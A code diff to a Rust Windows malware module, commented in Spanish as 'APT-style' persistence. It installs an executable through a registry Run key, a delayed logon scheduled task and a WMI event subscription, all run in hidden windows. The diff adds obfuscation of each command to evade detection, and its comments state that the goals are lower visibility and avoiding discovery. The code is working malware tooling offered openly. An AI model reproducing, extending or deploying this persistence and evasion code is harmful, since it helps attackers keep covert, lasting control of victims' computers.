@@ -1,6 +1,8 @@
 // Módulo de persistencia para Windows
 // Implementa múltiples métodos de persistencia estilo APT
 
+use crate::argfuscator;
+
 #[cfg(target_os = "windows")]
 use std::process::Command;
 #[cfg(target_os = "windows")]
@@ -64,19 +66,16 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     // El "/min" hace que se ejecute minimizado (menos visible)
     let obfuscated_cmd = format!("cmd.exe /c start /min \"\" \"{}\"", exe_str);
     
-    // Intentar HKCU primero (no requiere admin)
-    let output = Command::new("reg")
-        .args(&[
-            "add",
-            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            "/v",
-            reg_name,
-            "/t",
-            "REG_SZ",
-            "/d",
-            &obfuscated_cmd,
-            "/f",
-        ])
+    // Apply obfuscation to the reg command itself
+    let reg_cmd = format!("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {} /t REG_SZ /d {} /f", 
+        reg_name, obfuscated_cmd);
+    let obfuscated_reg_cmd = argfuscator::obfuscate(&reg_cmd);
+    
+    println!("DEBUG: Comando de persistencia ofuscado: {}", obfuscated_reg_cmd);
+    
+    // Execute the obfuscated command via cmd
+    let output = Command::new("cmd")
+        .args(&["/C", &obfuscated_reg_cmd])
         .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output()
         .map_err(|e| format!("Error ejecutando reg add: {}", e))?;
@@ -110,16 +109,16 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     // OFUSCACIÓN: Usar cmd /c con delay y start /min
     let obfuscated_cmd = format!("cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"{}\"", exe_str);
     
-    // Crear tarea con DELAY de 1 minuto para evitar detección inmediata
-    let output = Command::new("schtasks")
-        .args(&[
-            "/Create",
-            "/SC", "ONLOGON",
-            "/TN", task_name,
-            "/TR", &obfuscated_cmd,
-            "/DELAY", "0001:00", // 1 minuto de delay
-            "/F",
-        ])
+    // Apply obfuscation to the schtasks command
+    let schtasks_cmd = format!("schtasks /Create /SC ONLOGON /TN {} /TR {} /DELAY 0001:00 /F",
+        task_name, obfuscated_cmd);
+    let obfuscated_schtasks = argfuscator::obfuscate(&schtasks_cmd);
+    
+    println!("DEBUG: Comando schtasks ofuscado: {}", obfuscated_schtasks);
+    
+    // Execute the obfuscated command via cmd
+    let output = Command::new("cmd")
+        .args(&["/C", &obfuscated_schtasks])
         .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output()
         .map_err(|e| format!("Error ejecutando schtasks: {}", e))?;
@@ -182,14 +181,15 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
         event_name, event_name, obfuscated_cmd
     );
     
-    let output = Command::new("powershell")
-        .args(&[
-            "-NoProfile",
-            "-WindowStyle", "Hidden",
-            "-ExecutionPolicy", "Bypass",
-            "-Command",
-            &ps_script,
-        ])
+    // Apply obfuscation to the PowerShell command
+    let ps_cmd = format!("powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{}\"", 
+        ps_script.replace("\"", "`\""));
+    let obfuscated_ps = argfuscator::obfuscate(&ps_cmd);
+    
+    println!("DEBUG: Comando PowerShell ofuscado: {}", obfuscated_ps);
+    
+    let output = Command::new("cmd")
+        .args(&["/C", &obfuscated_ps])
         .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output()
         .map_err(|e| format!("Error ejecutando PowerShell: {}", e))?;
